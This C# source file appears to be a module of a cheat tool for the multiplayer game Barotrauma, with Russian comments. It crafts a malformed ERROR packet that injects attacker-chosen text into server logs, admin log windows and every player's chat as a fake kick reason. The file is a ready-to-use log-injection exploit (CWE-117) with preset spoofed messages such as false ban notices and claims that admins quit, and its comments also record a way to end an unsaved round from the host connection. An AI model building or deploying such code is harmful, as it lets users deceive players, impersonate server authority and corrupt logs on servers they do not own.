// ============================================================================
//  ErrorForgeModule.cs — «ФОРЖЕР ЛОГОВ» v2 (волна 718-719)
//  CWE-117 log injection через ERROR-пакет. ТВОЙ ТЕКСТ → лог сервера.
//
//  ПУТЬ (GameServer.cs:1035 → HandleClientError → MISSING_ENTITY):
//    u16 eventID, u16 entityID, byte subCount(≤5), subCount × string(≤16)
//    строки попадают В ЛОГ СЕРВЕРА БЕЗ санитизации:
//    "...has reported an error: ... Loaded submarines don't match
//     (client: <ТВОЙ ТЕКСТ>, server: <реальные сабы>)"
//    Куда: консоль сервера (красный Error) + файл лога + окна клиентов
//    с пермом ServerLog (админ видит вживую). Парсинг <1мс: 0 страйков,
//    валидный пакет: 0 киков.
//
//  ★ ДЕТАЛЬ ФОРМАТА (вскрыта при ревью): чанки склеиваются string.Join(", ")
//    → между кусками появится мусор ", ". Поэтому:
//      текст ≤16 символов  → subCount=1 → ЧИСТЫЙ текст без разделителей
//      текст длиннее       → режем на 16, между кусками будет ", "
//    >16 симв. в строке = честный кик ("malformed error data") — не шлём.
//
//  ★★ ГЛАВНОЕ (вскрыто полевым тестом юзера, волна 720): хвост HandleClientError
//  ВСЕГДА кикает отправителя, и причина кика БРОАДКАСТИТСЯ ВСЕМ ИГРОКАМ В ЧАТ:
//    DisconnectClient → SendChatMessage(peerDisconnectPacket.ChatMessage(name))
//    → "ServerMessage.KickedFromServer [client=X] ... Причина: <errorStr С НАШИМ ТЕКСТОМ>"
//  ИТОГ ОДНОГО ПАКЕТА (цена = твой дисконнект):
//    1. текст ВСЕМ игрокам в общий чат (как причина кика)
//    2. текст в консоль сервера (красный Error) + файл лога
//    3. текст в окна клиентов с пермом ServerLog (админы)
//    4. отдельный файл event_error_log_server_<имя>_<время>.log на сервере
//    5. запись в GameAnalytics HashSet (вечная, ~100B)
//  КИК НЕ ОТКЛЮЧИТЬ (безусловный хвост хендлера) — это дизайн "ошибся = рассинхрон = пока".
//  БОНУС-ФАКТ: ERROR от ОУНЕРСКОГО соединения (хост) → EndGame(wasSaved:false) —
//  раунд умирает без сейва (недостижимо нам, мы не оунер; задокументировано).
//  80 символов максимум за пакет. GameStarted обязателен (иначе хвост с 'client:' не собирается).
// ============================================================================

using System;
using Barotrauma;
using Barotrauma.Networking;
using Microsoft.Xna.Framework;

namespace CSHUB.Modules
{
    public class ErrorForgeModule : CSModuleBase
    {
        public override string Id   => "error_forge";
        public override string Name => "Error Forge";
        public override string Description =>
            "Type ANY text -> EVERY player sees it in chat as YOUR kick reason + server console/log " +
            "+ admin log windows + dedicated .log file on the server (CWE-117, no sanitization). " +
            "You WILL be disconnected (hardwired by design) - reconnect and repeat. 16 chars = clean line.";
        public override string Category => "exploit";

        public override string GetLabel() => "Error Forge 📜";

        private static GUIMessageBox _box;
        private static GUITextBox _textBox;
        private static GUITextBlock _status;

        public override void OnClick()
        {
            if (_box != null) { _box.Close(); _box = null; return; }
            Open();
        }

        private static void Open()
        {
            if (GameMain.Client?.ClientPeer == null)
            {
                GUI.AddMessage("[ErrorForge] нет подключения", Color.Red);
                return;
            }

            _box = new GUIMessageBox(
                headerText: "ERROR FORGE — инъекция в лог сервера",
                text: "",
                buttons: new LocalizedString[] { },
                relativeSize: new Vector2(0.66f, 0.5f));

            var content = _box.Content;
            content.ClearChildren();

            new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.34f), content.RectTransform),
                "Твой текст УЛЕТИТ:\n" +
                "1) ВСЕМ ИГРОКАМ В ЧАТ — как причина твоего кика\n" +
                "2) в консоль+файл лога сервера (красный Error)\n" +
                "3) в окна админов (перм ServerLog)\n" +
                "⚠ ТЕБЯ КИКНЕТ после отправки (так устроен сервер) — просто перезайди",
                textAlignment: Alignment.CenterLeft, wrap: true, font: GUIStyle.SmallFont)
            { TextColor = new Color(255, 170, 120) };

            // --- строка ввода ---
            var textRow = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.13f), content.RectTransform),
                isHorizontal: true);
            textRow.RelativeSpacing = 0.01f;

            new GUITextBlock(
                new RectTransform(new Vector2(0.22f, 1f), textRow.RectTransform),
                "Текст:", textAlignment: Alignment.CenterRight);
            _textBox = new GUITextBox(
                new RectTransform(new Vector2(0.78f, 1f), textRow.RectTransform),
                "BAN: SKYLEIOTIC (CHEATS)");

            new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.1f), content.RectTransform),
                "(≤16 символов = чистый текст без мусора; длиннее = чанки через ', ')",
                font: GUIStyle.SmallFont)
            { CanBeFocused = false, TextColor = Color.Gray };

            // --- кнопка ОТПРАВИТЬ ---
            var sendBtn = new GUIButton(
                new RectTransform(new Vector2(0.97f, 0.16f), content.RectTransform),
                "📤 ОТПРАВИТЬ В ЛОГ СЕРВЕРА");
            sendBtn.Color = new Color(180, 70, 50);
            sendBtn.OnClicked = (b, d) =>
            {
                Forge(_textBox?.Text ?? "");
                return true;
            };

            // --- пресеты (заполняют поле) ---
            var presetRow = new GUILayoutGroup(
                new RectTransform(new Vector2(0.97f, 0.22f), content.RectTransform),
                isHorizontal: true);
            presetRow.RelativeSpacing = 0.01f;

            AddPreset(presetRow, "BAN: HEDREX!", "BAN: HEDREX! (cheats)");
            AddPreset(presetRow, "-15000 MK", "SERVER SOLD SUB: -15000 MK");
            AddPreset(presetRow, "ADMINS QUIT", "ADMINS QUIT. SERVER UNMANAGED");

            _status = new GUITextBlock(
                new RectTransform(new Vector2(0.97f, 0.14f), content.RectTransform),
                "Статус: жду отправки.", wrap: true, font: GUIStyle.SmallFont);
            _status.TextColor = new Color(120, 220, 255);
        }

        private static void AddPreset(GUILayoutGroup parent, string label, string text)
        {
            var btn = new GUIButton(
                new RectTransform(new Vector2(0.32f, 1f), parent.RectTransform), label);
            btn.Color = new Color(60, 110, 150);
            btn.OnClicked = (b, d) =>
            {
                if (_textBox != null) { _textBox.Text = text; }
                return true;
            };
        }

        private static void Forge(string line)
        {
            if (GameMain.Client?.ClientPeer == null)
            {
                GUI.AddMessage("[ErrorForge] нет подключения", Color.Red);
                return;
            }
            if (string.IsNullOrWhiteSpace(line))
            {
                GUI.AddMessage("[ErrorForge] пустой текст", Color.Red);
                return;
            }
            if (GameMain.NetworkMember == null || !GameMain.NetworkMember.GameStarted)
            {
                GUI.AddMessage("[ErrorForge] раунд не запущен — хвост с 'client:' не формируется (лог получит только цифры)", Color.Orange);
            }

            line = line.Trim();
            bool clean = line.Length <= 16;
            int chunkCount = clean ? 1 : (line.Length + 15) / 16;
            if (chunkCount > 5)
            {
                line = line.Substring(0, 80);
                chunkCount = 5;
            }

            var chunks = new string[chunkCount];
            for (int i = 0; i < chunkCount; i++)
            {
                int len = Math.Min(16, line.Length - i * 16);
                chunks[i] = line.Substring(i * 16, len);
            }

            try
            {
                var msg = new WriteOnlyMessage();
                msg.WriteByte((byte)ClientPacketHeader.ERROR);
                msg.WriteByte(1); // ClientNetError.MISSING_ENTITY (internal — литерал)
                msg.WriteUInt16((ushort)new Random().Next(0, 65535)); // уникальный → утечка в GameAnalytics
                msg.WriteUInt16(0);                  // entityID=0 → "entity that doesn't exist"
                msg.WriteByte((byte)chunkCount);
                for (int i = 0; i < chunkCount; i++) { msg.WriteString(chunks[i]); }
                GameMain.Client.ClientPeer.Send(msg, DeliveryMethod.Reliable);
            }
            catch (Exception e)
            {
                GUI.AddMessage("[ErrorForge] fail: " + e.Message, Color.Red);
                return;
            }

            string mode = clean ? "ЧИСТО (1 чанк)" : "чанки через ', '";
            string result = $"[ErrorForge] отправлено ({mode}): \"{line}\" — всех увидят в чате как причину кика, тебя сейчас отключит";
            if (_status != null) { _status.Text = "→ " + result; }
            GUI.AddMessage(result, Color.OrangeRed);
        }
    }
}
